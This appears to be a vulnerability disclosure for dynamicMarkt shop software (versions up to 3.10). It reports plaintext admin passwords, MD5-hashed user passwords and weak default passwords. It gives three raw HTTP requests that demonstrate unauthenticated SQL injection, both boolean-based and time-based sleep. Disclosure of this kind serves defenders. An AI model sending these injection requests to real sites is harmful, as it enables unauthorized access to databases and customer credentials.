# Multiple Vulnerabilities in dynamicMarkt Software
I was unable to contact the vendor. The homepage returns 500 Internal Server Error for at least 10 month now.

You should know, that the admin backend password is stored in plaintext inside the database!
The user passwords are hashed using MD5. dynamicMarkt sets a weak 7 char long password by default.

These vulnerabilities affects *dynamicMarkt* <= 3.10.

## SQL Injections (unauthenticated)

### *kat* param
```
GET /index.php?page=category&topic=offers&do=show&kat=1169231751%20or%202819%3d02819 HTTP/1.1
Host: localhost
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US,en-GB;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close
Cache-Control: max-age=0
Cookie: dm_lang=deu
```

### *kat1* param (unauthenticated)
```
POST /index.php HTTP/1.1
Host: localhost
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US,en-GB;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
Cookie: dm_lang=deu

art=kaeufer&kat1=(select*from(select(sleep(20)))a)&Submit=Weiter&page=signup
```

### *parent* param (unauthenticated)
```
GET /index.php?page=category&action=&topic=offers&uid=36&oid=&do=shop&art=2&parent=020911029%20or%202590%3d02590&line=neu HTTP/1.1
Host: localhost
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US,en-GB;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close
Cache-Control: max-age=0
Cookie: dm_lang=deu
```
